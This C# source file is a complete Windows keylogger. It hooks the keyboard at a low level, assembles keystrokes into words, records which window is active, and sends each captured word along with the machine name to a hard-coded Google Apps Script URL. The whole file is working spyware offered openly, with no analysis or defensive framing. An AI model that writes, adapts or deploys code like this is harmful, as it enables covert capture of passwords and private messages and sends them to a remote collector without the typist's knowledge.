using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerWithCSharp
{
   public class LogPayload
   {
      public string WindowTitle { get; set; }
      public string Content { get; set; }
      public bool IsNavigationOnly { get; set; }
   }

   public class Program
   {
      private static readonly string GoogleSheetWebAppUrl = "https://script.google.com/macros/s/AKfycbxX_tXeWij7CmDBHMRIOEeJ4k6zakO1JnUKm4wFEHRUh8FK1soAuSGrXou5Y9PfphRj/exec";
      private static readonly HttpClient httpClient = new HttpClient();

      // Word / Sentence buffer & locks
      private static readonly StringBuilder logBuffer = new StringBuilder();
      private static readonly object bufferLock = new object();

      // Sequential Queue for HTTP requests (guarantees strictly in-order logs in Google Sheets)
      private static readonly ConcurrentQueue<LogPayload> logQueue = new ConcurrentQueue<LogPayload>();

      // Track active window state
      private static string lastActiveWindowTitle = "";

      // Timers
      private static System.Threading.Timer windowMonitorTimer;
      private static System.Threading.Timer idleFlushTimer;

      #region Hook Keyboard & Active Window P/Invoke

      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 0x0100;

      private static readonly LowLevelKeyboardProc _proc = HookCallback;
      private static IntPtr _hookID = IntPtr.Zero;

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool UnhookWindowsHookEx(IntPtr hhk);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr GetModuleHandle(string lpModuleName);

      [DllImport("user32.dll")]
      private static extern IntPtr GetForegroundWindow();

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

      private static string GetActiveWindowTitle()
      {
         try
         {
            IntPtr handle = GetForegroundWindow();
            if (handle != IntPtr.Zero)
            {
               StringBuilder buff = new StringBuilder(256);
               if (GetWindowText(handle, buff, 256) > 0)
               {
                  return buff.ToString();
               }
            }
         }
         catch { }
         return "Desktop / Unknown";
      }

      private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

      private static IntPtr SetHook(LowLevelKeyboardProc proc)
      {
         using (Process curProcess = Process.GetCurrentProcess())
         {
            using (ProcessModule curModule = curProcess.MainModule)
            {
               return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
         }
      }

      private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
      {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
            int vkCode = Marshal.ReadInt32(lParam);
            ProcessKey(vkCode);
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
      }

      #endregion Hook Keyboard & Active Window P/Invoke

      #region Key Processing & Buffering Logic

      private static void ProcessKey(int vkCode)
      {
         Keys key = (Keys)vkCode;
         string textToFlush = null;

         lock (bufferLock)
         {
            if (key == Keys.Space || key == Keys.Tab || key == Keys.Enter || key == Keys.Return)
            {
               if (logBuffer.Length > 0)
               {
                  textToFlush = logBuffer.ToString();
                  logBuffer.Clear();
               }
            }
            else if (key == Keys.Back)
            {
               if (logBuffer.Length > 0)
               {
                  logBuffer.Remove(logBuffer.Length - 1, 1);
               }
            }
            else
            {
               string ch = KeyToReadableString(key, vkCode);
               if (!string.IsNullOrEmpty(ch))
               {
                  logBuffer.Append(ch);
               }
            }
         }

         if (!string.IsNullOrWhiteSpace(textToFlush))
         {
            string currentWindow = GetActiveWindowTitle();
            EnqueueLog(currentWindow, textToFlush.Trim(), false);
         }
      }

      private static string KeyToReadableString(Keys key, int vkCode)
      {
         // Letters A-Z
         if (key >= Keys.A && key <= Keys.Z)
         {
            bool isShift = (Control.ModifierKeys & Keys.Shift) != 0;
            bool isCaps = Console.CapsLock;
            bool isUpper = isShift ^ isCaps;

            char letter = (char)vkCode;
            return isUpper ? letter.ToString() : letter.ToString().ToLower();
         }

         // Top row numbers D0-D9
         if (key >= Keys.D0 && key <= Keys.D9)
         {
            return (vkCode - (int)Keys.D0).ToString();
         }

         // Numpad numbers
         if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
         {
            return (vkCode - (int)Keys.NumPad0).ToString();
         }

         // Common punctuation symbols
         switch (key)
         {
            case Keys.OemPeriod: return ".";
            case Keys.Oemcomma: return ",";
            case Keys.OemMinus: return "-";
            case Keys.Oemplus: return "+";
            case Keys.Oem1: return ";";
            case Keys.Oem2: return "/";
            case Keys.Oem3: return "`";
            case Keys.Oem4: return "[";
            case Keys.Oem5: return "\\";
            case Keys.Oem6: return "]";
            case Keys.Oem7: return "'";
            default: return null; // Ignore modifiers (Shift, Ctrl, Alt, etc.)
         }
      }

      #endregion Key Processing & Buffering Logic

      #region Navigation & Idle Monitoring

      private static void CheckActiveWindowChange(object state)
      {
         string currentWindow = GetActiveWindowTitle();

         if (!string.Equals(currentWindow, lastActiveWindowTitle, StringComparison.OrdinalIgnoreCase))
         {
            // First flush any remaining typed text from previous window
            string textToFlush = null;
            lock (bufferLock)
            {
               if (logBuffer.Length > 0)
               {
                  textToFlush = logBuffer.ToString();
                  logBuffer.Clear();
               }
            }

            if (!string.IsNullOrWhiteSpace(textToFlush))
            {
               EnqueueLog(lastActiveWindowTitle, textToFlush.Trim(), false);
            }

            // Log navigation event to new active window
            lastActiveWindowTitle = currentWindow;
            EnqueueLog(currentWindow, "[Navigated Window]", true);
         }
      }

      private static void FlushBufferIfIdle(object state)
      {
         string textToFlush = null;
         lock (bufferLock)
         {
            if (logBuffer.Length > 0)
            {
               textToFlush = logBuffer.ToString();
               logBuffer.Clear();
            }
         }

         if (!string.IsNullOrWhiteSpace(textToFlush))
         {
            string currentWindow = GetActiveWindowTitle();
            EnqueueLog(currentWindow, textToFlush.Trim(), false);
         }
      }

      #endregion Navigation & Idle Monitoring

      #region Sequential Queue Worker & HTTP Sender

      private static void EnqueueLog(string windowTitle, string content, bool isNavOnly)
      {
         if (string.IsNullOrWhiteSpace(windowTitle)) windowTitle = "Desktop / Unknown";
         logQueue.Enqueue(new LogPayload
         {
            WindowTitle = windowTitle,
            Content = content,
            IsNavigationOnly = isNavOnly
         });
      }

      private static void StartQueueWorker()
      {
         Task.Run(async () =>
         {
            while (true)
            {
               LogPayload payload;
               if (logQueue.TryDequeue(out payload))
               {
                  await SendPayloadToGoogleSheetAsync(payload);
               }
               else
               {
                  await Task.Delay(200);
               }
            }
         });
      }

      private static async Task SendPayloadToGoogleSheetAsync(LogPayload payload)
      {
         try
         {
            string formattedContent;
            if (payload.IsNavigationOnly)
            {
               formattedContent = "[Active Window] " + payload.WindowTitle;
            }
            else
            {
               formattedContent = "[" + payload.WindowTitle + "] " + payload.Content;
            }

            Console.WriteLine("Posting to Sheet: " + formattedContent);

            string jsonPayload = "{" +
               "\"machineName\":\"" + Environment.MachineName + "\"," +
               "\"windowTitle\":\"" + EscapeJson(payload.WindowTitle) + "\"," +
               "\"activeWindow\":\"" + EscapeJson(payload.WindowTitle) + "\"," +
               "\"logContent\":\"" + EscapeJson(formattedContent) + "\"," +
               "\"text\":\"" + EscapeJson(formattedContent) + "\"" +
            "}";

            var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
            await httpClient.PostAsync(GoogleSheetWebAppUrl, content);
         }
         catch (Exception ex)
         {
            Console.WriteLine("Google Sheet Logging Error: " + ex.Message);
         }
      }

      private static string EscapeJson(string str)
      {
         if (string.IsNullOrEmpty(str)) return "";
         return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
      }

      #endregion Sequential Queue Worker & HTTP Sender

      private static void HookKeyboard()
      {
         _hookID = SetHook(_proc);
         Application.Run();
         UnhookWindowsHookEx(_hookID);
      }

      private static void Main(string[] args)
      {
         Console.WriteLine("Key Logger & Active Window Tracker initialized...");

         lastActiveWindowTitle = GetActiveWindowTitle();
         EnqueueLog(lastActiveWindowTitle, "[Active Window]", true);

         // 1. Start single-threaded sequential HTTP queue worker
         StartQueueWorker();

         // 2. Poll active window changes every 500ms (logs folder/window navigation without typing)
         windowMonitorTimer = new System.Threading.Timer(CheckActiveWindowChange, null, 500, 500);

         // 3. Auto-flush pending typed buffer if idle for 3 seconds
         idleFlushTimer = new System.Threading.Timer(FlushBufferIfIdle, null, 3000, 3000);

         // 4. Start keyboard hook
         HookKeyboard();
      }
   }
}